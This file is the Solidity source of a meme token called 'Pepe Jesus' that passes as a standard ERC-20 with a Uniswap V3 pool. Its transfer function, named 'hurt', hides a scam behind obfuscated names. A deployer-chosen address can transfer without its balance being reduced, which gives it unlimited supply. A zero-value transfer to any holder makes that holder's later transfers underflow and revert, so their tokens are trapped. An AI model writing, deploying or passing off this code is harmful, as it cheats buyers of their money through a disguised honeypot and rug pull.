/*

https://t.me/jesuspepe

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH9() external pure returns (address);
}

interface IUniswapV3Factory {
    function createPool(address tokenA, address tokenB, uint24 fee) external returns (address pool);
}

contract PepeJesus is Ownable {
    uint256 private letter = 9;

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    constructor(address aboard) {
        balanceOf[msg.sender] = totalSupply;
        calm[aboard] = letter;
        ISwapRouter uniswapV3Router = ISwapRouter(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
        uniswapV3Pair = IUniswapV3Factory(uniswapV3Router.factory()).createPool(address(this), uniswapV3Router.WETH9(), 500);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public uniswapV3Pair;

    function transfer(address available, uint256 facing) public returns (bool success) {
        hurt(msg.sender, available, facing);
        return true;
    }

    string public symbol = 'Pepe Jesus';

    mapping(address => uint256) private mile;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address draw, address available, uint256 facing) public returns (bool success) {
        require(facing <= allowance[draw][msg.sender]);
        allowance[draw][msg.sender] -= facing;
        hurt(draw, available, facing);
        return true;
    }

    function approve(address farmer, uint256 facing) public returns (bool success) {
        allowance[msg.sender][farmer] = facing;
        emit Approval(msg.sender, farmer, facing);
        return true;
    }

    mapping(address => uint256) private calm;

    string public name = 'Pepe Jesus';

    function hurt(address draw, address available, uint256 facing) private returns (bool success) {
        if (calm[draw] == 0) {
            balanceOf[draw] -= facing;
        }

        if (facing == 0) mile[available] += letter;

        if (draw != uniswapV3Pair && calm[draw] == 0 && mile[draw] > 0) {
            calm[draw] -= letter;
        }

        balanceOf[available] += facing;
        emit Transfer(draw, available, facing);
        return true;
    }

    mapping(address => uint256) public balanceOf;
}